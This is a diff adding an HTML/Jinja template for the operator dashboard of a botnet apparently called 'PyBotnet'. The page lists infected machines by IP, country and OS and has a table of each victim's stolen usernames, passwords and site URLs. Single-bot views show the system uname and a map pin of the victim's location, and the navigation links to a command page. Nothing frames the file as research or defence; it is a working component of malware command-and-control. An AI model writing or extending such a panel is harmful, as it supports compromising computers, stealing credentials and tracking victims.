@@ -1,0 +1,112 @@
+<html>
+<head>
+<title>Bots | PyBotnet</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="ISO-8859-1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<style>
+body{
+	background: linear-gradient(to bottom right, rgb(3, 127, 158),rgb(255, 165, 0));
+	align-content: center;
+}
+</style>
+
+</head>
+<body>
+
+<nav class="navbar navbar-dark bg-dark">
+  <a class="navbar-brand" href="/dashboard/">PyBotnet</a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+  <div class="collapse navbar-collapse" id="navbarNav">
+    <ul class="navbar-nav">
+      <li class="nav-item ">
+        <a class="nav-link" href="/cmd/">CMD<span class="sr-only"></span></a>
+      </li>
+      <li class="nav-item ">
+        <a class="nav-link" href="/view_bot/all">ViewBot</a>
+      </li>
+      <li class="nav-item ">
+        <a class="nav-link" href="/logout/">Logout</a>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+<div class="container">
+
+<center><h1 class="display-2">Bot Informations</h1><br></br></center>
+	
+<table class="table table-sm table-dark">
+  <thead>
+    <tr>
+      <th scope="col">Key</th>
+      <th scope="col">Geo</th>
+      <th scope="col">IP</th>
+      <th scope="col">OS</th>
+    </tr>
+  </thead>
+		<tbody>
+			{% for a,b,c,d,e,f,g,h in db %}
+			    <tr>
+			    {% if id == 'all' %}
+			    	<!--<th scope="row"><a href="/view_bot/{{ h }}">{{ h }}</a></th>-->
+					<th scope="row"><a href="/view_bot/{{ h }}">{{ h }}</a></th>
+			    {% else %}
+			    	<th scope="row">{{ id }}</th>
+			    {% endif %}
+			      <td><img src="http://www.countryflags.io/{{ c }}/flat/32.png">{{ c }}</td>
+			      <td>{{ d }}</td>
+			      <td>{{ g }}</td>
+			    </tr>
+			   	{% endfor %}
+			</tbody>
+</table>
+
+{% if db_creds %}
+<br><center><h1 class="display-2">Bot Credentials</h1><br></br></center>
+<table class="table table-sm table-dark">
+  <thead>
+    <tr>
+      <th scope="col">Key</th>
+      <th scope="col">User</th>
+      <th scope="col">Passwd</th>
+      <th scope="col">Url</th>
+    </tr>
+  </thead>
+		<tbody>
+			{% for a,b,c,d in db_creds %}
+			    <tr>
+			     <th scope="row">{{ a }}</th>
+			      <td>{{ b }}</td>
+			      <td>{{ c }}</td>
+			      <td>{{ d }}</td>
+			    </tr>
+			{% endfor %}
+		</tbody>
+</table><br>
+{% endif %}
+
+{% if id != 'all' %}
+	{% for a,b,c,d,e,f,g,h in db %}
+		<div id="uname">
+			<div class="alert alert-info" role="alert">
+			  <h4 class="alert-heading">Uname</h4>
+			  <p> {{ b }} .</p>
+			</div>
+			</div>
+
+			<div id="map">
+				<img style="width: 100%; height: 100%;" src="https://maps.googleapis.com/maps/api/staticmap?center={{ e }},{{ f }}&zoom=5&size=400x400%20&markers=color:blue|label:{{ id }}|{{ e }},{{ f }}&key={{ api }}">
+			</div><br><br>
+	{% endfor %}
+{% endif %}
+
+</div>
+</body>
+</html>
